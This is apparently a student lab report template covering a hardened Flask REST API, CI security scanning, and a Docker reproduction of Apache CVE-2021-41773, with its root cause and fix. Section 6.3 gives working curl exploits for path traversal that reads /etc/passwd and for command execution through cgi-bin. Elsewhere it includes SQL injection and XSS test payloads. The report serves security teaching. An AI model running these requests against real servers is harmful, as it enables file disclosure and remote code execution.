# Laboratory Work No. 1

## Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis

| Field | Value |
|---|---|
| Variant number | `<variant>` |
| Student surname and name | `<Surname Name>` |
| HDU number | `<HDU number>` |
| Group | `<group>` |
| Date | 2026-10-19 |
| Repository | `<public GitHub/GitLab URL>` |
| Successful pipeline | `<GitLab pipeline URL>` |

---

## 1. Purpose

The purpose of this work is to study the complete security lifecycle of a web
service: design an API with protection against common OWASP Top 10 risks,
integrate static and dependency security checks into CI/CD, reproduce a real
CVE in a controlled Docker environment, identify its root cause, apply a fix,
and verify both the security fix and the preserved functionality.

## 2. Environment

- Windows 11, PowerShell 7
- Python 3.11.2
- Flask 3.1.3, bcrypt 5.0.0, PyJWT 2.15.1
- SQLite 3
- pytest 8.4.2, Bandit 1.8.6, pip-audit 2.9.0
- Git 2.56.0, GitLab CI
- Docker Desktop and Docker Compose (for the CVE part)

## 3. API implementation

The application is created with the Flask application factory. The database
is initialized automatically; demo data is inserted only when the user table
is empty.

| Method | Path | Authentication | Purpose |
|---|---|---|---|
| POST | `/auth/login` | No | Check credentials, return a JWT |
| GET | `/api/data` | Bearer JWT | List posts, optional `?q=` search |
| POST | `/api/data` | Bearer JWT | Create a post |
| DELETE | `/api/data/<id>` | Bearer JWT | Delete own post; admin may delete any |
| GET | `/api/me` | Bearer JWT | Return the current identity |
| GET | `/health` | No | Liveness probe |

The required three methods are `POST /auth/login`, `GET /api/data`, and
`POST /api/data`. The remaining endpoints are supporting functionality.

## 4. Implemented security measures

### 4.1 SQL injection

All queries are constant SQL strings with bound parameters. The search endpoint
uses:

```python
conn.execute(
    "... WHERE posts.title LIKE ? OR posts.body LIKE ? ...",
    (f"%{query}%", f"%{query}%"),
)
```

No user input is concatenated into SQL. The login query also uses a bound
parameter. A test sends `' OR 1=1 --` to both login and search; login returns
`401`, and search returns zero rows.

### 4.2 XSS

Input is validated for type, length, and control characters. All values that
are returned to the client are HTML-escaped with
`html.escape(value, quote=True)`. Responses use `application/json`,
`X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, and
`Content-Security-Policy: default-src 'none'; frame-ancestors 'none'`.

Stored payload:

```html
<script>alert("xss")</script>
```

Returned value:

```text
&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
```

The test suite verifies that `<script>` and `<img` no longer appear as markup
in responses.

### 4.3 Authentication

- Passwords are hashed with bcrypt cost 12 and a random salt.
- A successful login returns a JWT signed with HS256.
- Claims: `sub`, `username`, `role`, `iss`, `aud`, `iat`, `nbf`, `exp`, `jti`.
- Lifetime: 30 minutes by default.
- The middleware requires the `Bearer` scheme, verifies the signature,
  issuer, audience, expiry, and required claims, and checks that the user still
  exists.
- Only `HS256` is accepted by the decoder; `alg: none` is rejected.
- Unknown user and wrong password return the same `401` response.
- Five failed attempts per IP and username within five minutes trigger `429`.
- The JWT secret is supplied through the environment, never committed.

### 4.4 Access control

Deleting a post requires the current user to be its author or to have the
`admin` role. This prevents horizontal privilege escalation (IDOR).

## 5. CI/CD

`.gitlab-ci.yml` runs on every push and merge request:

| Stage | Tool | Result |
|---|---|---|
| Functional and security tests | pytest | 16 passed |
| SAST | Bandit | no issues identified |
| SCA | pip-audit | no known vulnerabilities |

The pipeline uploads `reports/bandit.json` and `reports/pip-audit.json` as job
artifacts even when a scan fails.

### Local evidence

```text
$ pytest -q
................                                                         [100%]
16 passed in 0.90s

$ bandit -r app -f txt
No issues identified.

$ pip-audit -r requirements.txt
No known vulnerabilities found
```

![Local security checks](docs/screenshots/api-local.png)

### CI screenshots

`<insert screenshot of the green GitLab pipeline>`

`<insert screenshot of the Bandit report>`

`<insert screenshot of the pip-audit report>`

## 6. CVE analysis

### 6.1 Selected vulnerability

**CVE-2021-41773** — path traversal and file disclosure in Apache HTTP Server
2.4.49. CVSS 3.1 base score: **9.8 (Critical)**. NVD reports exploitation in
the wild. With CGI enabled, the same primitive allows remote code execution.

### 6.2 Vulnerable environment

```bash
git clone --depth 1 --filter=blob:none --sparse https://github.com/vulhub/vulhub.git
cd vulhub
git sparse-checkout set httpd/CVE-2021-41773
cd httpd/CVE-2021-41773
docker compose build
docker compose up -d
```

The service listens on `http://127.0.0.1:8080`. The Vulhub Dockerfile enables
`mod_cgi`/`mod_cgid` and replaces the default `<Directory />` policy with
`Require all granted`.

When Docker Hub is unreachable, the images can be pulled through a registry
mirror and retagged locally:

```bash
docker pull dockerproxy.net/vulhub/httpd:2.4.49
docker tag  dockerproxy.net/vulhub/httpd:2.4.49 vulhub/httpd:2.4.49
docker pull dockerproxy.net/library/httpd:2.4.51
docker tag  dockerproxy.net/library/httpd:2.4.51 httpd:2.4.51
```

### 6.3 Reproduction

File disclosure:

```bash
curl -v --path-as-is \
  http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

The response contains the host container's `/etc/passwd`, including
`root:x:0:0`.

Command execution:

```bash
curl -v --data "echo;id" \
  'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```

The response contains `uid=...`, proving that `/bin/sh` was executed outside
the document root.

### 6.4 Root cause

The defect is in URL path normalization introduced in 2.4.49. Encoded dot
segments (`%2e`) were not collapsed consistently before the request was mapped
to the filesystem. Access checks were performed against an existing alias
directory (`/icons/` or `/cgi-bin/`), but the resolved path then escaped the
document root.

Two configuration conditions increased the impact:

1. `<Directory />` was set to `Require all granted`, so the escaped path was
   not blocked by Apache's usual deny-by-default rule.
2. CGI was enabled, so a path pointing to `/bin/sh` turned file access into
   command execution.

This is therefore a **path canonicalization / access-control interaction bug**,
not an injection in application code. The fix must correct normalization and
keep a deny-by-default filesystem policy.

### 6.5 Applied fix

1. Upgrade from Apache 2.4.49 to **2.4.51**. Version 2.4.50 was an incomplete
   fix and is affected by CVE-2021-42013, so 2.4.51 is the minimum safe target.
2. Keep the default `Require all denied` for `<Directory />`; grant access only
   to the document root and the CGI directory.
3. Keep CGI disabled unless it is required.

Files:

- `cve/fixed-version-only/` — 2.4.51 with the original permissive
  configuration, used to isolate the effect of the version upgrade.
- `cve/fixed-hardened/` — 2.4.51 with deny-by-default root policy.

### 6.6 Verification

```powershell
powershell -ExecutionPolicy Bypass -File .\cve\verify-fix.ps1
```

Expected result:

| Environment | `/` | Traversal | `/etc/passwd` | `id` via CGI |
|---|---|---|---|---|
| Vulhub 2.4.49 | 200 | 200 | disclosed | executed |
| 2.4.51 permissive | 200 | 400 | blocked | blocked |
| 2.4.51 hardened | 200 | 400 | blocked | blocked |

The `200` on `/` in the fixed environments is the regression check: the normal
web service still works after the patch.

### 6.7 Screenshots

![Vulnerable traversal and CGI execution](docs/screenshots/cve-before.png)

![Fixed environments and regression test](docs/screenshots/cve-after.png)

## 7. Conclusion

The work demonstrates that security must be built into both the application and
the delivery process. Parameterized SQL, output encoding, bcrypt, and a strict
JWT verification middleware remove the three targeted application weaknesses.
Bandit and pip-audit add repeatable checks to CI. The CVE part shows that a
single normalization defect in a mature web server can become critical when it
is combined with a permissive filesystem policy and CGI. Upgrading to 2.4.51
removes the defect; deny-by-default configuration provides defense in depth;
and the regression request confirms that the fix does not break normal service.

## Appendix A. Control questions

**1. Why is bcrypt preferable to SHA-256 for passwords?**

SHA-256 is fast and unsalted by default, so an attacker can test billions of
candidates per second and use precomputed tables. bcrypt is deliberately slow,
uses a per-password random salt, and has a tunable cost factor. The same
password therefore produces different hashes, and offline guessing is much more
expensive.

**2. What is the difference between SAST and DAST?**

SAST analyzes source code, bytecode, or configuration without running the
application. It can find dangerous patterns early but has false positives and
cannot see runtime configuration. DAST tests a running application from the
outside, like an attacker, and can find real runtime behavior, but needs a
deployed target and may miss code paths it cannot reach.

**3. How does a JWT work?**

A JWT has three Base64URL parts: header, payload, and signature. The payload
contains claims such as subject, role, issuer, and expiry. The server signs
header and payload with a secret (HS256) or private key (RS256). On each request
it recomputes and verifies the signature and validates the claims. The token is
signed, not encrypted, so it must not contain secrets.

**4. What are the risks of not auditing dependencies?**

The application can inherit known vulnerabilities in libraries, including
remote code execution, deserialization, path traversal, or denial of service.
Attackers can fingerprint versions and use public exploits. Unmaintained
dependencies also stop receiving security patches.

**5. Why use Docker and Vulhub instead of installing vulnerable software
directly?**

Containers isolate the vulnerable service, make the environment reproducible,
and allow a clean reset. Vulhub provides pinned versions and documented exploits,
so the experiment is repeatable and does not pollute the host system.

**6. What is the difference between a vulnerability and an exploit?**

A vulnerability is a weakness in software or configuration. An exploit is a
concrete technique or payload that takes advantage of it. In this work the
vulnerability is the path normalization defect; the `curl` request with encoded
dot segments is the exploit.

**7. Why is regression testing important after a patch?**

A security fix can change behavior, break legitimate requests, or introduce a
new bug. Regression tests prove that normal functionality still works and that
the fix did not merely hide the symptom.

**8. How does reproducing CVEs help a security specialist?**

It turns advisory text into concrete evidence: affected versions, preconditions,
observable indicators, and effective mitigations. This supports vulnerability
management, incident detection, penetration testing, and prioritization of
patches.

## Appendix B. Submission checklist

- [ ] Public repository URL added to the title page.
- [ ] Last successful pipeline URL added.
- [ ] CI screenshots inserted.
- [ ] CVE reproduction and fix screenshots inserted.
- [ ] Variant, surname, name, and HDU number filled in.
- [ ] `cve/fixed-hardened/` attached.
